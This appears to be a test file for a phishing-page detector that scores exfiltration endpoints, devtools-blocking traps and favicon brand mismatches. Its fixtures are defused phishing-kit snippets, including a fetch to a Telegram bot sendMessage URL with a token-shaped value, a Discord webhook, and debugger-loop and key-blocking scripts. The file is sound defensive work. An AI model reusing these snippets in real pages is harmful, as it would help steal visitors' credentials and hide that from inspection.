import { describe, expect, test } from 'bun:test';
import { parseHTML } from 'linkedom';
import { collectPageSignals } from '../src/page-signals.ts';
import { scorePageSignals, scoreStandalonePage } from '../src/rules.ts';
import { describePage } from '../src/extract-form.ts';

function collect(html: string, pageUrl = 'https://example.com/login') {
  const doc = parseHTML(`<!doctype html><html><body>${html}</body></html>`)
    .document as unknown as Document;
  return collectPageSignals(doc, pageUrl);
}

/** A defused script: the text is readable, the browser will never run it. */
function script(body: string): string {
  return `<script type="text/plain" data-ppg-defused="1">${body}</script>`;
}

describe('collectPageSignals', () => {
  test('finds a Telegram exfil endpoint and its token in script text', () => {
    const signals = collect(
      script(`fetch("https://api.telegram.org/bot8123456789:AAHxyzABCDEFGHIJKLMNOPQRSTUVWXY0123/sendMessage")`),
    );
    expect(signals.exfilSinks.sort()).toEqual(['telegram_bot_api', 'telegram_bot_token']);
    expect(signals.referencedHosts).toContain('api.telegram.org');
  });

  test('a link to a Telegram channel is not an exfil endpoint', () => {
    // Plenty of legitimate sites link to their own channel. The bot API is the
    // thing that receives data; t.me is a place people read.
    const signals = collect('<a href="https://t.me/somechannel">Join us</a>');
    expect(signals.exfilSinks).toEqual([]);
  });

  test('finds a Discord webhook and a form relay', () => {
    expect(collect(script('const u = "https://discord.com/api/webhooks/1/abc";')).exfilSinks)
      .toContain('discord_webhook');
    expect(collect('<form action="https://formspree.io/f/abc"></form>').exfilSinks)
      .toContain('form_relay');
  });

  test('reads a sink out of a script src as well as out of script text', () => {
    const signals = collect('<script src="https://webhook.site/abc-123"></script>');
    expect(signals.exfilSinks).toContain('request_bin');
  });

  test('ignores JSON data blocks, which are not code', () => {
    const signals = collect(
      '<script type="application/ld+json">{"url":"https://api.telegram.org/bot"}</script>',
    );
    expect(signals.exfilSinks).toEqual([]);
  });

  test('recognises the devtools traps a kit ships', () => {
    expect(collect(script('setInterval(function(){ debugger; }, 50);')).devtoolsBlocks)
      .toContain('debugger_loop');
    expect(collect(script('document.onkeydown = function(e){ if (e.keyCode == 123) return false; };')).devtoolsBlocks)
      .toContain('devtools_key_block');
    expect(collect('<script src="https://cdn.example.com/disable-devtool.min.js"></script>').devtoolsBlocks)
      .toContain('devtools_detect_lib');
    expect(collect(script('if (window.outerWidth - window.innerWidth > 160) location.href = "/";')).devtoolsBlocks)
      .toContain('devtools_size_probe');
  });

  test('a stray debugger statement on its own is not a trap', () => {
    // Shipped bundles contain leftover `debugger` statements. It is the loop
    // around it that makes the page unreadable.
    expect(collect(script('function f(){ debugger; }')).devtoolsBlocks).toEqual([]);
  });

  test('finds right-click blocking written as an attribute', () => {
    expect(collect('<body oncontextmenu="return false"><p>x</p>').devtoolsBlocks)
      .toContain('contextmenu_block');
  });

  test('does not list a form action as a referenced host', () => {
    // Where a form posts is already `cross_origin_action`. Counting it again
    // scored the same observation twice and pushed every existing phishing
    // fixture 20 points higher for no new information.
    const signals = collect('<form action="https://collect.elsewhere.test/x"><input name="u"></form>');
    expect(signals.referencedHosts).not.toContain('collect.elsewhere.test');
    // Still searched for sinks, though.
    expect(collect('<form action="https://formspree.io/f/a"></form>').exfilSinks).toContain('form_relay');
  });

  test('collects declared icons and always the default path', () => {
    const signals = collect('<link rel="shortcut icon" href="https://cdn.other.test/apple.ico">');
    expect(signals.iconUrls).toContain('https://cdn.other.test/apple.ico');
    expect(signals.iconUrls).toContain('https://example.com/favicon.ico');
  });

  test('never mutates the document it reads', () => {
    const doc = parseHTML(
      `<!doctype html><html><body>${script('debugger; setInterval(function(){},1)')}</body></html>`,
    ).document as unknown as Document;
    const before = doc.body.innerHTML;
    collectPageSignals(doc, 'https://example.com/');
    expect(doc.body.innerHTML).toBe(before);
  });
});

describe('scorePageSignals', () => {
  const page = describePage('https://secure-login.sbs/verify', 'Sign in');

  test('a bot token is worth more than the endpoint it posts to', () => {
    const hits = scorePageSignals(
      collect(
        script(`fetch("https://api.telegram.org/bot8123456789:AAHxyzABCDEFGHIJKLMNOPQRSTUVWXY0123/sendMessage")`),
        'https://secure-login.sbs/verify',
      ),
      page,
    );
    // The token and the API endpoint are one finding, not two.
    expect(hits.map((h) => h.id)).toEqual(['telegram_bot_token']);
    expect(hits[0]!.points).toBe(40);
  });

  test('blocking devtools scores, blocking right-click barely does', () => {
    const strong = scorePageSignals(
      collect(script('setInterval(function(){ debugger; }, 50);'), 'https://secure-login.sbs/verify'),
      page,
    );
    expect(strong.find((h) => h.id === 'devtools_blocked')?.points).toBe(25);

    const weak = scorePageSignals(
      collect('<body oncontextmenu="return false"><p>x</p>', 'https://secure-login.sbs/verify'),
      page,
    );
    expect(weak.map((h) => h.id)).toEqual(['right_click_blocked']);
    expect(weak[0]!.points).toBe(5);
  });

  test('an icon served by another domain is a hit on its own', () => {
    const hits = scorePageSignals(
      collect('<link rel="icon" href="https://www.apple.com.test/favicon.ico">', 'https://secure-login.sbs/verify'),
      page,
    );
    expect(hits.map((h) => h.id)).toEqual(['favicon_hotlinked']);
  });

  test('an icon that matches a brand the domain does not own is the strong case', () => {
    const hits = scorePageSignals(collect('<p>x</p>', 'https://secure-login.sbs/verify'), page, {
      faviconMatch: { domain: 'apple.com', distance: 2 },
    });
    const mismatch = hits.find((h) => h.id === 'favicon_brand_mismatch');
    expect(mismatch?.points).toBe(35);
    expect(mismatch?.detail).toContain('Apple');
  });

  test("does not flag a brand's own icon on its own site", () => {
    const apple = describePage('https://www.apple.com/signin', 'Apple');
    const hits = scorePageSignals(collect('<p>x</p>', 'https://www.apple.com/signin'), apple, {
      faviconMatch: { domain: 'apple.com', distance: 0 },
    });
    expect(hits.map((h) => h.id)).not.toContain('favicon_brand_mismatch');
  });

  test('ordinary analytics and payment infrastructure is not an exfil destination', () => {
    // The whole rule is worthless if it fires on every checkout on the web.
    const shop = describePage('https://shop.example/checkout', 'Checkout');
    const hits = scorePageSignals(
      collect(
        script(`fetch("https://www.google-analytics.com/collect"); load("https://js.stripe.com/v3/");`),
        'https://shop.example/checkout',
      ),
      shop,
      { hasSensitiveFields: true },
    );
    expect(hits.map((h) => h.id)).not.toContain('sensitive_post_third_party');
  });

  test('an unrelated host does fire, but only when the page wants sensitive data', () => {
    const signals = collect(
      script('fetch("https://collector.unknown-host.test/x")'),
      'https://secure-login.sbs/verify',
    );
    expect(scorePageSignals(signals, page, { hasSensitiveFields: false }).map((h) => h.id))
      .not.toContain('sensitive_post_third_party');
    expect(scorePageSignals(signals, page, { hasSensitiveFields: true }).map((h) => h.id))
      .toContain('sensitive_post_third_party');
  });

  test('says nothing at all about an allowlisted site', () => {
    const hits = scorePageSignals(
      collect(script('setInterval(function(){ debugger; }, 50);'), 'https://secure-login.sbs/verify'),
      page,
      { allowlist: ['secure-login.sbs'] },
    );
    expect(hits).toEqual([]);
  });
});

describe('scoreStandalonePage', () => {
  const page = describePage('https://secure-login.sbs/verify', 'Sign in');

  test('blocking devtools is not, by itself, a reason to warn', () => {
    // Suspicious about what? Without a form there is nothing being asked for.
    const hits = scorePageSignals(
      collect(script('setInterval(function(){ debugger; }, 50);'), 'https://secure-login.sbs/verify'),
      page,
    );
    expect(scoreStandalonePage(hits, page).verdict).toBe('safe');
  });

  test('a bot token on a page with no form is still danger', () => {
    const hits = scorePageSignals(
      collect(
        script(`fetch("https://api.telegram.org/bot8123456789:AAHxyzABCDEFGHIJKLMNOPQRSTUVWXY0123/sendMessage")`),
        'https://secure-login.sbs/verify',
      ),
      page,
    );
    expect(scoreStandalonePage(hits, page).verdict).toBe('danger');
  });

  test('one standalone-eligible finding asks the user to check, two assert', () => {
    const one = scorePageSignals(collect('<form action="https://formspree.io/f/a"></form>', 'https://secure-login.sbs/verify'), page);
    expect(scoreStandalonePage(one, page).verdict).toBe('caution');

    const two = scorePageSignals(
      collect('<form action="https://formspree.io/f/a"></form>', 'https://secure-login.sbs/verify'),
      page,
      { faviconMatch: { domain: 'apple.com', distance: 1 } },
    );
    // exfil_sink_endpoint 35 + favicon_brand_mismatch 35
    expect(scoreStandalonePage(two, page)).toMatchObject({ verdict: 'danger', score: 70 });
  });

  test('stays quiet on an allowlisted site', () => {
    const hits = scorePageSignals(
      collect(`<form action="https://formspree.io/f/a"></form>`, 'https://secure-login.sbs/verify'),
      page,
    );
    expect(scoreStandalonePage(hits, page, { allowlist: ['secure-login.sbs'] }).verdict).toBe('safe');
  });
});
